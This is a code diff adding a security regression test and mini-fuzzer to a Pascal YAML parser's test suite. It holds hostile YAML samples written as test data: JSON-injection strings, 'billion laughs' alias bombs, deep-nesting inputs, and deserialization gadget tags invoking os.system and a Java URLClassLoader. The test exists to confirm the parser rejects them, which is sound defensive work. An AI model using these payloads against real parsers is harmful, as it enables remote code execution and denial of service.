@@ -187,6 +187,8 @@ type
     /// an OpenAPI-shaped spec in YAML must yield the same TDocVariantData
     // as its JSON counterpart - this is the invariant mopenapi relies on
     procedure YamlOpenapiEquivalence;
+    /// known attacks on YAML parsers, and a deterministic mini-fuzzer
+    procedure YamlSecurity;
   published
     /// some low-level RTTI access
     // - especially the field type retrieval from published properties
@@ -9097,6 +9099,7 @@ begin
   YamlFileApi;
   YamlRecursionDepth;
   YamlOpenapiEquivalence;
+  YamlSecurity;
 end;
 
 type
@@ -9348,7 +9351,27 @@ const
      ExpectedJson: '[["a","b"],{"c":"multi line"},{"c":"multi line"}]')
   );
 
-  ERRORS: array[0..14] of TYamlGoldenCase = (
+  ERRORS: array[0..20] of TYamlGoldenCase = (
+    (Name: 'json-injection-after-double-quote';
+     // trailing text after a quoted scalar was emitted as raw JSON
+     Yaml: 'user: "x","admin":true,"y":"z"';
+     ExpectedJson: ''),
+    (Name: 'json-injection-after-single-quote';
+     Yaml: 'user: ''x'',"admin":true';
+     ExpectedJson: ''),
+    (Name: 'json-injection-in-flow';
+     Yaml: 'a: {k: "v" j: 1}';
+     ExpectedJson: ''),
+    (Name: 'flow-missing-comma';
+     Yaml: 'a: [[1] [2]]';
+     ExpectedJson: ''),
+    (Name: 'flow-trailing-text';
+     Yaml: 'a: [1] x';
+     ExpectedJson: ''),
+    (Name: 'nul-character';
+     // IsNumberJson('1'#0'2') = true would emit invalid JSON
+     Yaml: 'a: 1'#0'2';
+     ExpectedJson: ''),
     (Name: 'flow-multi-line-unterminated';
      Yaml: 'a: [1,'#10'  2'#10'b: 3';
      ExpectedJson: ''),
@@ -9556,6 +9579,173 @@ begin
     YamlExpectRaise('compact nested sequence must respect YamlMaxDepth', yaml);
   finally
     YamlMaxDepth := saved;
+  end;
+end;
+
+procedure TTestCoreProcess.YamlSecurity;
+const
+  SPECIAL: RawUtf8 = '&*<[]{}:-"''\#|>!%?,~. '#10#10#9#13#0;
+  TOKENS: array[0..5] of RawUtf8 = (
+    '&a ', '*a', '<<: ', '[', '{', '- ');
+var
+  i, j, n, p, ok, raised: integer;
+  y, json: RawUtf8;
+  savedSize: Int64;
+  savedDepth: integer;
+  start: Int64;
+  seed: cardinal;
+  doc: TDocVariantData;
+  w: TTextWriter;
+
+  function Rep(const s: RawUtf8; count: integer): RawUtf8;
+  var
+    tmp: TTextWriter;
+  begin
+    tmp := TTextWriter.CreateOwnedStream;
+    try
+      while count > 0 do
+      begin
+        tmp.AddString(s);
+        dec(count);
+      end;
+      tmp.SetText(result);
+    finally
+      tmp.Free;
+    end;
+  end;
+
+  function Next(max: integer): integer;
+  begin
+    // deterministic xorshift32, so that any failure is reproducible
+    seed := seed xor (seed shl 13);
+    seed := seed xor (seed shr 17);
+    seed := seed xor (seed shl 5);
+    result := (seed shr 4) mod cardinal(max);
+  end;
+
+begin
+  savedSize := YamlMaxAliasSize;
+  savedDepth := YamlMaxDepth;
+  try
+    // 1. "billion laughs": exponential alias expansion, also via "<<" merges
+    YamlMaxAliasSize := 1 shl 20;
+    y := 'a0: &a0 [lol, lol, lol, lol]'#10;
+    for i := 1 to 15 do
+      Append(y, FormatUtf8('a%: &a% [*a%, *a%, *a%, *a%]'#10,
+        [i, i, i - 1, i - 1, i - 1, i - 1]));
+    YamlExpectRaise(' for billion laughs flow', y);
+    y := 'm0: &m0 {k: lol}'#10;
+    for i := 1 to 30 do // each level doubles: merged keys + new x% key
+      Append(y, FormatUtf8('m%: &m%'#10'  <<: *m%'#10'  x%: *m%'#10,
+        [i, i, i - 1, i, i - 1]));
+    YamlExpectRaise(' for billion laughs merge', y);
+    // 2. any deep nesting should raise EYamlException, not EStackOverflow
+    // - each nesting level uses less than 1KB of stack
+    YamlMaxDepth := 64;
+    YamlExpectRaise(' for deep flow seq', Rep('[', 1000) + Rep(']', 1000));
+    YamlExpectRaise(' for deep flow map', Rep('{a: ', 1000) + Rep('}', 1000));
+    YamlExpectRaise(' for deep multi-line flow',
+      Rep('['#10, 1000) + Rep(']'#10, 1000));
+    YamlExpectRaise(' for deep compact seq', Rep('- ', 1000) + 'x');
+    YamlExpectRaise(' for deep anchors map', 'k: ' + Rep('&a ', 1000) + 'x');
+    YamlExpectRaise(' for deep anchors seq', '- ' + Rep('&a ', 1000) + 'x');
+    YamlExpectRaise(' for deep anchors flow', '[' + Rep('&a ', 1000) + 'x]');
+    w := TTextWriter.CreateOwnedStream;
+    try
+      for i := 0 to 1000 do
+      begin
+        w.AddChars(' ', i * 2);
+        w.AddShort('- a: &x'#10);
+      end;
+      w.SetText(y);
+    finally
+      w.Free;
+    end;
+    YamlExpectRaise(' for deep implicit maps with anchors', y);
+    YamlMaxDepth := savedDepth;
+    // 3. no object instantiation from tags (e.g. SnakeYAML CVE-2022-1471)
+    YamlExpectRaise(' for python tag', 'a: !!python/object/apply:os.system ["id"]');
+    YamlExpectRaise(' for java tag', '!!javax.script.ScriptEngineManager ' +
+      '[!!java.net.URLClassLoader [[!!java.net.URL ["http://x/"]]]]');
+    // 4. linear time for many anchors / aliases and big merges (was O(n^2))
+    w := TTextWriter.CreateOwnedStream;
+    try
+      for i := 1 to 30000 do
+        w.Add('a%: &a% %'#10, [i, i, i]);
+      for i := 1 to 30000 do
+        w.Add('b%: *a%'#10, [i, i]);
+      w.AddShort('src: &s'#10);
+      for i := 1 to 30000 do
+        w.Add('  k%: %'#10, [i, i]);
+      w.AddShort('dst:'#10'  <<: *s'#10);
+      for i := 1 to 30000 do
+        w.Add('  j%: %'#10, [i, i]);
+      w.SetText(y);
+    finally
+      w.Free;
+    end;
+    start := GetTickCount64;
+    YamlToVariant(y, doc);
+    start := GetTickCount64 - start;
+    CheckEqual(doc.Count, 60002, 'anchors count');
+    CheckEqual(doc.I['b30000'], 30000, 'last alias');
+    CheckEqual(doc.O['dst']^.Count, 60000, 'merged count');
+    CheckEqual(doc.O['dst']^.I['k30000'], 30000, 'merged value');
+    CheckUtf8(start < 2000, 'O(n) anchors and merges: %ms', [start]);
+    // 5. deterministic mini-fuzzer over the golden cases: any input should
+    // generate valid JSON or raise EYamlException - nothing else
+    seed := 2463534242;
+    ok := 0;
+    raised := 0;
+    TSynLog.Family.ExceptionIgnoreCurrentThread := true;
+    try
+      for i := 1 to 20000 do
+      begin
+        y := GOLDEN[Next(length(GOLDEN))].Yaml;
+        for j := 0 to Next(4) do
+        begin
+          n := length(y);
+          p := Next(n + 1);
+          case Next(7) of
+            0:
+              if p < n then
+                y[p + 1] := SPECIAL[Next(length(SPECIAL)) + 1];
+            1:
+              insert(SPECIAL[Next(length(SPECIAL)) + 1], y, p + 1);
+            2:
+              delete(y, p + 1, Next(8) + 1);
+            3:
+              insert(copy(y, Next(n + 1) + 1, Next(16) + 1), y, p + 1);
+            4:
+              insert(TOKENS[Next(length(TOKENS))], y, p + 1);
+            5:
+              if p < n then
+                y[p + 1] := AnsiChar(Next(256));
+          else
+            Append(y, #10, GOLDEN[Next(length(GOLDEN))].Yaml);
+          end;
+        end;
+        try
+          json := YamlToJson(y);
+          if IsValidJson(json) then
+            inc(ok)
+          else
+            CheckUtf8(false, 'fuzz #% invalid JSON from %', [i, y]);
+        except
+          on EYamlException do
+            inc(raised);
+          on E: Exception do
+            CheckUtf8(false, 'fuzz #% % from %', [i, PClass(E)^, y]);
+        end;
+      end;
+    finally
+      TSynLog.Family.ExceptionIgnoreCurrentThread := false;
+    end;
+    CheckUtf8((ok > 1000) and
+              (raised > 1000), 'fuzz ok=% raised=%', [ok, raised]);
+  finally
+    YamlMaxAliasSize := savedSize;
+    YamlMaxDepth := savedDepth;
   end;
 end;
 
